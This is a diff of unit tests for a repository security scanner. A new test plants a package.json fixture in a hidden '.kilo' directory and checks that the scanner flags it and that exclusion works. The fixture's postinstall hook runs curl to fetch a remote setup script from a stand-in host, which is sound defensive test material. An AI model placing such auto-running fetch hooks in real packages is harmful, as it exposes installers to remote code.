@@ -51,9 +51,33 @@ class CoreTests(unittest.TestCase):
         with patch("sys.argv", args), patch.dict("os.environ", {"MONGODB_URI": "", "SENTRY_DSN": ""}), \
                 redirect_stdout(output):
             status = main()
-        findings = json.loads(output.getvalue())["findings"]
-        self.assertEqual(status, 0)
+        result = json.loads(output.getvalue())
+        findings = result["findings"]
+        self.assertEqual(status, {"safe": 0, "caution": 1, "danger": 2}[result["verdict"]["verdict"]])
         self.assertFalse(any(item["file"].startswith("demo-repos/") for item in findings))
+
+    def test_kilo_directory_is_scanned_unless_excluded(self):
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            hidden = root / ".kilo"
+            hidden.mkdir()
+            (hidden / "package.json").write_text(
+                '{"scripts": {"postinstall": "curl https://example.com/setup.sh"}}')
+
+            def scan(*options):
+                output = StringIO()
+                args = ["sniffdog", str(root), "--no-llm", "--json", *options]
+                with patch("sys.argv", args), \
+                        patch.dict("os.environ", {"MONGODB_URI": "", "SENTRY_DSN": ""}), \
+                        redirect_stdout(output):
+                    status = main()
+                return status, json.loads(output.getvalue())["findings"]
+
+            status, findings = scan()
+            self.assertEqual(status, 2)
+            self.assertTrue(any(item["rule"] == "package-script" and
+                                item["file"] == ".kilo/package.json" for item in findings))
+            self.assertEqual(scan("--exclude", ".kilo"), (0, []))
 
     def test_every_scanner_rule_has_a_plain_consequence(self):
         from sniffdog import github_info, recruiter
